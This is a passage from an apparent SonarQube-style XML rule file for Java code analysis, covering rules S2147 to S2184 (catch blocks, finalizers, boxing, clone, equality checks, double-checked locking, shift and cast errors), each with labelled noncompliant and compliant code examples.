            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void run () {
            try {
            while (true) {
            // do stuff
            }
            }catch (InterruptedException e) {
            LOGGER.log(Level.WARN, &quot;Interrupted!&quot;, e);
            // Restore interrupted state...
            Thread.currentThread().interrupt();
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;http://cwe.mitre.org/data/definitions/391.html&quot;&gt;MITRE, CWE-391&lt;/a&gt;
            - Unchecked Error Condition &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.ibm.com/developerworks/java/library/j-jtp05236/index.html?ca=drs-#2.1&quot;&gt;Dealing
            with InterruptedException&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cwe</tag>
        <tag>error-handling</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2147' priority='MINOR'>
        <configKey>S2147</configKey>
        <name>Catches should be combined</name>
        <description>
            &lt;p&gt;Since Java 7 it has been possible to catch multiple exceptions at once. Therefore, when multiple
            &lt;code&gt;catch&lt;/code&gt; blocks have the same code, they
            should be combined for better readability.&lt;/p&gt;
            &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt; that this rule is automatically disabled when the project's &lt;code&gt;sonar.java.source&lt;/code&gt;
            is lower than &lt;code&gt;7&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            catch (IOException e) {
            doCleanup();
            logger.log(e);
            }
            catch (SQLException e) { // Noncompliant
            doCleanup();
            logger.log(e);
            }
            catch (TimeoutException e) { // Compliant; block contents are different
            doCleanup();
            throw e;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            catch (IOException|SQLException e) {
            doCleanup();
            logger.log(e);
            }
            catch (TimeoutException e) {
            doCleanup();
            throw e;
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2151' priority='CRITICAL'>
        <configKey>S2151</configKey>
        <name>&quot;runFinalizersOnExit&quot; should not be called</name>
        <description>
            &lt;p&gt;Running finalizers on JVM exit is disabled by default. It can be enabled with &lt;code&gt;System.runFinalizersOnExit&lt;/code&gt;
            and
            &lt;code&gt;Runtime.runFinalizersOnExit&lt;/code&gt;, but both methods are deprecated because they are are
            inherently unsafe. &lt;/p&gt;
            &lt;p&gt;According to the Oracle Javadoc:&lt;/p&gt;
            &lt;blockquote&gt;
            &lt;p&gt;It may result in finalizers being called on live objects while other threads are concurrently
            manipulating those objects, resulting in erratic
            behavior or deadlock.&lt;/p&gt;
            &lt;/blockquote&gt;
            &lt;p&gt;If you really want to be execute something when the virtual machine begins its shutdown sequence,
            you should attach a shutdown hook. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String [] args) {
            ...
            System.runFinalizersOnExit(true); // Noncompliant
            ...
            }

            protected void finalize(){
            doSomething();
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public static void main(String [] args) {
            Runtime.addShutdownHook(new Runnable() {
            public void run(){
            doSomething();
            }
            });
            //...
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/4jZGBQ&quot;&gt;CERT, MET12-J.&lt;/a&gt; -
            Do not use finalizers &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2153' priority='MINOR'>
        <configKey>S2153</configKey>
        <name>Boxing and unboxing should not be immediately reversed</name>
        <description>
            &lt;p&gt;Boxing is the process of putting a primitive value into an analogous object, such as creating an
            &lt;code&gt;Integer&lt;/code&gt; to hold an &lt;code&gt;int&lt;/code&gt;
            value. Unboxing is the process of retrieving the primitive value from such an object.&lt;/p&gt;
            &lt;p&gt;Since the original value is unchanged during boxing and unboxing, there's no point in doing either
            when not needed. This also applies to autoboxing
            and auto-unboxing (when Java implicitly handles the primitive/object transition for you).&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public void examineInt(int a) {
            //...
            }

            public void examineInteger(Integer a) {
            // ...
            }

            public void func() {
            int i = 0;
            Integer iger1 = Integer.valueOf(0);
            double d = 1.0;

            int dIntValue = new Double(d).intValue(); // Noncompliant

            examineInt(new Integer(i).intValue()); // Noncompliant; explicit box/unbox
            examineInt(Integer.valueOf(i)); // Noncompliant; boxed int will be auto-unboxed

            examineInteger(i); // Compliant; value is boxed but not then unboxed
            examineInteger(iger1.intValue()); // Noncompliant; unboxed int will be autoboxed

            Integer iger2 = new Integer(iger1); // Noncompliant; unnecessary unboxing, value can be reused
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public void examineInt(int a) {
            //...
            }

            public void examineInteger(Integer a) {
            // ...
            }

            public void func() {
            int i = 0;
            Integer iger1 = Integer.valueOf(0);
            double d = 1.0;

            int dIntValue = (int) d;

            examineInt(i);

            examineInteger(i);
            examineInteger(iger1);
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
    </rule>

    <rule key='S2154' priority='MAJOR'>
        <configKey>S2154</configKey>
        <name>Dissimilar primitive wrappers should not be used with the ternary operator without explicit casting</name>
        <description>
            &lt;p&gt;If wrapped primitive values (e.g. &lt;code&gt;Integers&lt;/code&gt; and &lt;code&gt;Floats&lt;/code&gt;)
            are used in a ternary operator (e.g. &lt;code&gt;a?b:c&lt;/code&gt;), both
            values will be unboxed and coerced to a common type, potentially leading to unexpected results. To avoid
            this, add an explicit cast to a compatible
            type.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            Integer i = 123456789;
            Float f = 1.0f;
            Number n = condition ? i : f; // Noncompliant; i is coerced to float. n = 1.23456792E8
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            Integer i = 123456789;
            Float f = 1.0f;
            Number n = condition ? (Number) i : f; // n = 123456789
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2157' priority='CRITICAL'>
        <configKey>S2157</configKey>
        <name>&quot;Cloneables&quot; should implement &quot;clone&quot;</name>
        <description>
            &lt;p&gt;Simply implementing &lt;code&gt;Cloneable&lt;/code&gt; without also overriding &lt;code&gt;Object.clone()&lt;/code&gt;
            does not necessarily make the class cloneable. While
            the &lt;code&gt;Cloneable&lt;/code&gt; interface does not include a &lt;code&gt;clone&lt;/code&gt; method,
            it is required by convention, and ensures true cloneability.
            Otherwise the default JVM &lt;code&gt;clone&lt;/code&gt; will be used, which copies primitive values and
            object references from the source to the target. I.e.
            without overriding &lt;code&gt;clone&lt;/code&gt;, any cloned instances will potentially share members with
            the source instance.&lt;/p&gt;
            &lt;p&gt;Removing the &lt;code&gt;Cloneable&lt;/code&gt; implementation and providing a good copy
            constructor is another viable (some say preferable) way of allowing a
            class to be copied.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            class Team implements Cloneable { // Noncompliant
            private Person coach;
            private List&amp;lt;Person&amp;gt; players;
            public void addPlayer(Person p) {...}
            public Person getCoach() {...}
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            class Team implements Cloneable {
            private Person coach;
            private List&amp;lt;Person&amp;gt; players;
            public void addPlayer(Person p) { ... }
            public Person getCoach() { ... }

            @Override
            public Object clone() {
            Team clone = (Team) super.clone();
            //...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>api-design</tag>
        <tag>convention</tag>
    </rule>

    <rule key='S2159' priority='MAJOR'>
        <configKey>S2159</configKey>
        <name>Silly equality checks should not be made</name>
        <description>
            &lt;p&gt;Comparisons of dissimilar types will always return false. The comparison and all its dependent code
            can simply be removed. This includes:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; comparing an object with null &lt;/li&gt;
            &lt;li&gt; comparing an object with an unrelated primitive (E.G. a string with an int) &lt;/li&gt;
            &lt;li&gt; comparing unrelated classes &lt;/li&gt;
            &lt;li&gt; comparing an unrelated &lt;code&gt;class&lt;/code&gt; and &lt;code&gt;interface&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; comparing unrelated &lt;code&gt;interface&lt;/code&gt; types &lt;/li&gt;
            &lt;li&gt; comparing an array to a non-array &lt;/li&gt;
            &lt;li&gt; comparing two arrays &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Specifically in the case of arrays, since arrays don't override &lt;code&gt;Object.equals()&lt;/code&gt;,
            calling &lt;code&gt;equals&lt;/code&gt; on two arrays is the same
            as comparing their addresses. This means that &lt;code&gt;array1.equals(array2)&lt;/code&gt; is equivalent
            to &lt;code&gt;array1==array2&lt;/code&gt;.&lt;/p&gt;
            &lt;p&gt;However, some developers might expect &lt;code&gt;Array.equals(Object obj)&lt;/code&gt; to do more
            than a simple memory address comparison, comparing for
            instance the size and content of the two arrays. Instead, the &lt;code&gt;==&lt;/code&gt; operator or &lt;code&gt;Arrays.equals(array1,
            array2)&lt;/code&gt; should always be
            used with arrays.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            interface KitchenTool { ... };
            interface Plant {...}

            public class Spatula implements KitchenTool { ... }
            public class Tree implements Plant { ...}
            //...

            Spatula spatula = new Spatula();
            KitchenTool tool = spatula;
            KitchenTool [] tools = {tool};

            Tree tree = new Tree();
            Plant plant = tree;
            Tree [] trees = {tree};


            if (spatula.equals(tree)) { // Noncompliant; unrelated classes
            // ...
            }
            else if (spatula.equals(plant)) { // Noncompliant; unrelated class and interface
            // ...
            }
            else if (tool.equals(plant)) { // Noncompliant; unrelated interfaces
            // ...
            }
            else if (tool.equals(tools)) { // Noncompliant; array &amp;amp; non-array
            // ...
            }
            else if (trees.equals(tools)) { // Noncompliant; incompatible arrays
            // ...
            }
            else if (tree.equals(null)) { // Noncompliant
            // ...
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/5zdGBQ&quot;&gt;CERT, EXP02-J.&lt;/a&gt; -
            Do not use the Object.equals() method to compare two arrays &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>unused</tag>
    </rule>

    <rule key='S2160' priority='MINOR'>
        <configKey>S2160</configKey>
        <name>Subclasses that add fields should override &quot;equals&quot;</name>
        <description>
            &lt;p&gt;Extend a class that overrides &lt;code&gt;equals&lt;/code&gt; and add fields without overriding
            &lt;code&gt;equals&lt;/code&gt; in the subclass, and you run the risk of
            non-equivalent instances of your subclass being seen as equal, because only the superclass fields will be
            considered in the equality test.&lt;/p&gt;
            &lt;p&gt;This rule looks for classes that do all of the following:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; extend classes that override &lt;code&gt;equals&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; do not themselves override &lt;code&gt;equals&lt;/code&gt;. &lt;/li&gt;
            &lt;li&gt; add fields. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            private Season ripe;

            public boolean equals(Object obj) {
            if (obj == this) {
            return true;
            }
            if (this.class != obj.class) {
            return false;
            }
            Fruit fobj = (Fruit) obj;
            if (ripe.equals(fobj.getRipe()) {
            return true;
            }
            return false;
            }
            }

            public class Raspberry extends Fruit { // Noncompliant; instances will use Fruit's equals method
            private Color ripeColor;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class Fruit {
            private Season ripe;

            public boolean equals(Object obj) {
            if (obj == this) {
            return true;
            }
            if (this.class != obj.class) {
            return false;
            }
            Fruit fobj = (Fruit) obj;
            if (ripe.equals(fobj.getRipe()) {
            return true;
            }
            return false;
            }
            }

            public class Raspberry extends Fruit {
            private Color ripeColor;

            public boolean equals(Object obj) {
            if (! super.equals(obj)) {
            return false;
            }
            Raspberry fobj = (Raspberry) obj;
            if (ripeColor.equals(fobj.getRipeColor()) { // added fields are tested
            return true;
            }
            return false;
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>suspicious</tag>
    </rule>

    <rule key='S2165' priority='MINOR'>
        <configKey>S2165</configKey>
        <name>&quot;finalize&quot; should not set fields to &quot;null&quot;</name>
        <description>
            &lt;p&gt;There is no point in setting class fields to &lt;code&gt;null&lt;/code&gt; in a finalizer. If this
            this is a hint to the garbage collector, it is unnecessary -
            the object will be garbage collected anyway - and doing so may actually cause extra work for the garbage
            collector.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class Foo {
            private String name;

            @Override
            void finalize() {
            name = null; // Noncompliant; completely unnecessary
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>clumsy</tag>
        <tag>performance</tag>
    </rule>

    <rule key='S2166' priority='MAJOR'>
        <configKey>S2166</configKey>
        <name>Classes named like &quot;Exception&quot; should extend &quot;Exception&quot; or a subclass</name>
        <description>
            &lt;p&gt;Clear, communicative naming is important in code. It helps maintainers and API users understand the
            intentions for and uses of a unit of code.
            Using &quot;exception&quot; in the name of a class that does not extend &lt;code&gt;Exception&lt;/code&gt;
            or one of its subclasses is a clear violation of the expectation
            that a class' name will indicate what it is and/or does.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class FruitException { // Noncompliant; this has nothing to do with Exception
            private Fruit expected;
            private String unusualCharacteristics;
            private boolean appropriateForCommercialExploitation;
            // ...
            }

            public class CarException { // Noncompliant; the extends clause was forgotten?
            public CarException(String message, Throwable cause) {
            // ...
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public class FruitSport {
            private Fruit expected;
            private String unusualCharacteristics;
            private boolean appropriateForCommercialExploitation;
            // ...
            }

            public class CarException extends Exception {
            public CarException(String message, Throwable cause) {
            // ...
            &lt;/pre&gt;
        </description>
        <tag>convention</tag>
        <tag>error-handling</tag>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2167' priority='MINOR'>
        <configKey>S2167</configKey>
        <name>&quot;compareTo&quot; should not return &quot;Integer.MIN_VALUE&quot;</name>
        <description>
            &lt;p&gt;It is the sign, rather than the magnitude of the value returned from &lt;code&gt;compareTo&lt;/code&gt;
            that matters. Returning &lt;code&gt;Integer.MIN_VALUE&lt;/code&gt;
            does &lt;em&gt;not&lt;/em&gt; convey a higher degree of inequality, and doing so can cause errors because
            the return value of &lt;code&gt;compareTo&lt;/code&gt; is sometimes
            inversed, with the expectation that negative values become positive. However, inversing &lt;code&gt;Integer.MIN_VALUE&lt;/code&gt;
            yields
            &lt;code&gt;Integer.MIN_VALUE&lt;/code&gt; rather than &lt;code&gt;Integer.MAX_VALUE&lt;/code&gt;.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int compareTo(MyClass) {
            if (condition) {
            return Integer.MIN_VALUE; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int compareTo(MyClass) {
            if (condition) {
            return -1;
            }
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2168' priority='BLOCKER'>
        <configKey>S2168</configKey>
        <name>Double-checked locking should not be used</name>
        <description>
            &lt;p&gt;Double-checked locking is the practice of checking a lazy-initialized object's state both before
            and after a &lt;code&gt;synchronized&lt;/code&gt; block is
            entered to determine whether or not to initialize the object.&lt;/p&gt;
            &lt;p&gt;It does not work reliably in a platform-independent manner without additional synchronization for
            mutable instances of anything other than
            &lt;code&gt;float&lt;/code&gt; or &lt;code&gt;int&lt;/code&gt;. Using double-checked locking for the lazy
            initialization of any other type of primitive or mutable object
            risks a second thread using an uninitialized or partially initialized member while the first thread is still
            creating it, and crashing the
            program.&lt;/p&gt;
            &lt;p&gt;There are multiple ways to fix this. The simplest one is to simply not use double checked locking
            at all, and synchronize the whole method instead.
            With early versions of the JVM, synchronizing the whole method was generally advised against for performance
            reasons. But &lt;code&gt;synchronized&lt;/code&gt;
            performance has improved a lot in newer JVMs, so this is now a preferred solution. If you prefer to avoid
            using &lt;code&gt;synchronized&lt;/code&gt; altogether,
            you can use an inner &lt;code&gt;static class&lt;/code&gt; to hold the reference instead. Inner static
            classes are guaranteed to load lazily.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            @NotThreadSafe
            public class DoubleCheckedLocking {
            private static Resource resource;

            public static Resource getInstance() {
            if (resource == null) {
            synchronized (DoubleCheckedLocking.class) {
            if (resource == null)
            resource = new Resource();
            }
            }
            return resource;
            }

            static class Resource {

            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            @ThreadSafe
            public class SafeLazyInitialization {
            private static Resource resource;

            public static synchronized Resource getInstance() {
            if (resource == null)
            resource = new Resource();
            return resource;
            }

            static class Resource {
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;With inner static holder:&lt;/p&gt;
            &lt;pre&gt;
            @ThreadSafe
            public class ResourceFactory {
            private static class ResourceHolder {
            public static Resource resource = new Resource(); // This will be lazily initialised
            }

            public static Resource getResource() {
            return ResourceFactory.ResourceHolder.resource;
            }

            static class Resource {
            }
            }
            &lt;/pre&gt;
            &lt;p&gt;Using &quot;volatile&quot;:&lt;/p&gt;
            &lt;pre&gt;
            class ResourceFactory {
            private volatile Resource resource;

            public Resource getResource() {
            Resource localResource = resource;
            if (localResource == null) {
            synchronized (this) {
            localResource = resource;
            if (localResource == null) {
            resource = localResource = new Resource();
            }
            }
            }
            return localResource;
            }

            static class Resource {
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://www.cs.umd.edu/~pugh/java/memoryModel/DoubleCheckedLocking.html&quot;&gt;The
            &quot;Double-Checked Locking is Broken&quot; Declaration&lt;/a&gt; &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/6zdGBQ&quot;&gt;CERT, LCK10-J.&lt;/a&gt; -
            Use a correct form of the double-checked locking idiom &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://cwe.mitre.org/data/definitions/609.html&quot;&gt;MITRE, CWE-609&lt;/a&gt;
            - Double-checked locking &lt;/li&gt;
            &lt;li&gt; &lt;a href=&quot;https://docs.oracle.com/javase/specs/jls/se7/html/jls-12.html#jls-12.4&quot;&gt;JLS
            12.4&lt;/a&gt; - Initialization of Classes and Interfaces &lt;/li&gt;
            &lt;li&gt; Wikipedia: &lt;a href=&quot;https://en.wikipedia.org/wiki/Double-checked_locking#Usage_in_Java&quot;&gt;Double-checked
            locking&lt;/a&gt; &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
        <tag>cwe</tag>
        <tag>multi-threading</tag>
    </rule>

    <rule key='S2175' priority='MAJOR'>
        <configKey>S2175</configKey>
        <name>Inappropriate &quot;Collection&quot; calls should not be made</name>
        <description>
            &lt;p&gt;The &lt;code&gt;java.util.Collection&lt;/code&gt; API has methods that accept &lt;code&gt;Object&lt;/code&gt;
            parameters such as &lt;code&gt;Collection.remove(Object o)&lt;/code&gt;,
            and &lt;code&gt;Collection.contains(Object o)&lt;/code&gt;. When the actual type of the object provided to
            these methods is not consistent with the type declared
            on the &lt;code&gt;Collection&lt;/code&gt; instantiation, those methods will always return &lt;code&gt;false&lt;/code&gt;
            or &lt;code&gt;null&lt;/code&gt;. This is most likely unintended
            and hides a design problem.&lt;/p&gt;
            &lt;p&gt;This rule raises an issue when the type of the argument of the following APIs is unrelated to the
            type used for the &lt;code&gt;Collection&lt;/code&gt;
            declaration:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;code&gt;Collection.remove(Object o)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Collection.removeAll(Collection&amp;lt;?&amp;gt;)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Collection.contains(Object o)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;List.indexOf(Object o)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;List.lastIndexOf(Object o)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.containsKey(Object key)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.containsValue(Object value)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.get(Object key)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.getOrDefault(Object key, V defaultValue)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.remove(Object key)&lt;/code&gt; &lt;/li&gt;
            &lt;li&gt; &lt;code&gt;Map.remove(Object key, Object value)&lt;/code&gt; &lt;/li&gt;
            &lt;/ul&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public class S2175 {

            public static void main(String[] args) {
            String foo = &quot;42&quot;;
            Map&amp;lt;Integer, Object&amp;gt; map = new HashMap&amp;lt;&amp;gt;();
            map.remove(foo); // Noncompliant; will return 'null' for sure because 'map' is handling only Integer keys

            // ...

            List&amp;lt;String&amp;gt; list = new ArrayList&amp;lt;String&amp;gt;();
            Integer integer = Integer.valueOf(1);
            if (list.contains(integer)) { // Noncompliant; always false.
            list.remove(integer); // Noncompliant; list.add(integer) doesn't compile, so this will always return 'false'
            }
            }

            }
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/uDdGBQ&quot;&gt;CERT, EXP04-J.&lt;/a&gt; -
            Do not pass arguments to certain Java Collections Framework methods
            that are a different type than the collection parameter type &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2176' priority='CRITICAL'>
        <configKey>S2176</configKey>
        <name>Class names should not shadow interfaces or superclasses</name>
        <description>
            &lt;p&gt;While it's perfectly legal to give a class the same simple name as a class in another package that
            it extends or interface it implements, it's
            confusing and could cause problems in the future. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            package my.mypackage;

            public class Foo implements a.b.Foo { // Noncompliant
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            package my.mypackage;

            public class FooJr implements a.b.Foo {
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2177' priority='MAJOR'>
        <configKey>S2177</configKey>
        <name>Child class methods named for parent class methods should be overrides</name>
        <description>
            &lt;p&gt;When a method in a child class has the same signature as a method in a parent class, it is assumed
            to be an override. However, that's not the case
            when:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; the parent class method is &lt;code&gt;static&lt;/code&gt; and the child class method is not.
            &lt;/li&gt;
            &lt;li&gt; the arguments or return types of the child method are in different packages than those of the
            parent method. &lt;/li&gt;
            &lt;li&gt; the parent class method is &lt;code&gt;private&lt;/code&gt;. &lt;/li&gt;
            &lt;/ul&gt;
            &lt;p&gt;Typically, these things are done unintentionally; the private parent class method is overlooked,
            the &lt;code&gt;static&lt;/code&gt; keyword in the parent
            declaration is overlooked, or the wrong class is imported in the child. But if the intent is truly for the
            child class method to be different, then
            the method should be renamed to prevent confusion. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            // Parent.java
            import computer.Pear;
            public class Parent {

            public void doSomething(Pear p) {
            //,,,
            }

            public static void doSomethingElse() {
            //...
            }
            }

            // Child.java
            import fruit.Pear;
            public class Child extends Parent {

            public void doSomething(Pear p) { // Noncompliant; this is not an override
            // ...
            }


            public void doSomethingElse() { // Noncompliant; parent method is static
            //...
            }
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            // Parent.java
            import computer.Pear;
            public class Parent {

            public void doSomething(Pear p) {
            //,,,
            }

            public static void doSomethingElse() {
            //...
            }
            }

            // Child.java
            import computer.Pear; // import corrected
            public class Child extends Parent {

            public void doSomething(Pear p) { // true override (see import)
            //,,,
            }

            public static void doSomethingElse() {
            //...
            }
            }
            &lt;/pre&gt;
        </description>
        <tag>pitfall</tag>
    </rule>

    <rule key='S2178' priority='BLOCKER'>
        <configKey>S2178</configKey>
        <name>Short-circuit logic should be used in boolean contexts</name>
        <description>
            &lt;p&gt;The use of non-short-circuit logic in a boolean context is likely a mistake - one that could cause
            serious program errors as conditions are
            evaluated under the wrong circumstances. &lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            if(getTrue() | getFalse()) { ... } // Noncompliant; both sides evaluated
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            if(getTrue() || getFalse()) { ... } // true short-circuit logic
            &lt;/pre&gt;
            &lt;h2&gt;See&lt;/h2&gt;
            &lt;ul&gt;
            &lt;li&gt; &lt;a href=&quot;https://wiki.sei.cmu.edu/confluence/x/WNYxBQ&quot;&gt;CERT, EXP46-C.&lt;/a&gt; -
            Do not use a bitwise operator with a Boolean-like operand &lt;/li&gt;
            &lt;/ul&gt;
        </description>
        <tag>cert</tag>
    </rule>

    <rule key='S2183' priority='MINOR'>
        <configKey>S2183</configKey>
        <name>Ints and longs should not be shifted by zero or more than their number of bits-1</name>
        <description>
            &lt;p&gt;Since an &lt;code&gt;int&lt;/code&gt; is a 32-bit variable, shifting by more than +/-31 is
            confusing at best and an error at worst. When the runtime shifts
            32-bit integers, it uses the lowest 5 bits of the shift count operand. In other words, shifting an &lt;code&gt;int&lt;/code&gt;
            by 32 is the same as shifting it
            by 0, and shifting it by 33 is the same as shifting it by 1.&lt;/p&gt;
            &lt;p&gt;Similarly, when shifting 64-bit integers, the runtime uses the lowest 6 bits of the shift count
            operand and shifting &lt;code&gt;long&lt;/code&gt; by 64 is the
            same as shifting it by 0, and shifting it by 65 is the same as shifting it by 1.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            public int shift(int a) {
            int x = a &amp;gt;&amp;gt; 32; // Noncompliant
            return a &amp;lt;&amp;lt; 48; // Noncompliant
            }
            &lt;/pre&gt;
            &lt;h2&gt;Compliant Solution&lt;/h2&gt;
            &lt;pre&gt;
            public int shift(int a) {
            int x = a &amp;gt;&amp;gt; 31;
            return a &amp;lt;&amp;lt; 16;
            }
            &lt;/pre&gt;
            &lt;h2&gt;Exceptions&lt;/h2&gt;
            &lt;p&gt;This rule doesn't raise an issue when the shift by zero is obviously for cosmetic reasons:&lt;/p&gt;
            &lt;ul&gt;
            &lt;li&gt; When the value shifted is a literal. &lt;/li&gt;
            &lt;li&gt; When there is a similar shift at the same position on line before or after. E.g.: &lt;/li&gt;
            &lt;/ul&gt;
            &lt;pre&gt;
            bytes[loc+0] = (byte)(value &amp;gt;&amp;gt; 8);
            bytes[loc+1] = (byte)(value &amp;gt;&amp;gt; 0);
            &lt;/pre&gt;
        </description>
    </rule>

    <rule key='S2184' priority='MINOR'>
        <configKey>S2184</configKey>
        <name>Math operands should be cast before assignment</name>
        <description>
            &lt;p&gt;When arithmetic is performed on integers, the result will always be an integer. You can assign that
            result to a &lt;code&gt;long&lt;/code&gt;,
            &lt;code&gt;double&lt;/code&gt;, or &lt;code&gt;float&lt;/code&gt; with automatic type conversion, but
            having started as an &lt;code&gt;int&lt;/code&gt; or &lt;code&gt;long&lt;/code&gt;, the result
            will likely not be what you expect. &lt;/p&gt;
            &lt;p&gt;For instance, if the result of &lt;code&gt;int&lt;/code&gt; division is assigned to a
            floating-point variable, precision will have been lost before the
            assignment. Likewise, if the result of multiplication is assigned to a &lt;code&gt;long&lt;/code&gt;, it may
            have already overflowed before the assignment.&lt;/p&gt;
            &lt;p&gt;In either case, the result will not be what was expected. Instead, at least one operand should be
            cast or promoted to the final type before the
            operation takes place.&lt;/p&gt;
            &lt;h2&gt;Noncompliant Code Example&lt;/h2&gt;
            &lt;pre&gt;
            float twoThirds = 2/3; // Noncompliant; int division. Yields 0.0
            long millisInYear = 1_000*3_600*24*365; // Noncompliant; int multiplication. Yields 1471228928
            long bigNum = Integer.MAX_VALUE + 2; // Noncompliant. Yields -2147483647
            long bigNegNum = Integer.MIN_VALUE-1; //Noncompliant, gives a positive result instead of a negative one.
            Date myDate = new Date(seconds * 1_000); //Noncompliant, won't produce the expected result if seconds &amp;gt;
            2_147_483
            ...
            public long compute(int factor){
            return factor * 10_000; //Noncompliant, won't produce the expected result if factor &amp;gt; 214_748
            }

            public float compute2(long factor){
            return factor / 123; //Noncompliant, will be rounded to closest long integer
            }
            &lt;/pre&gt;
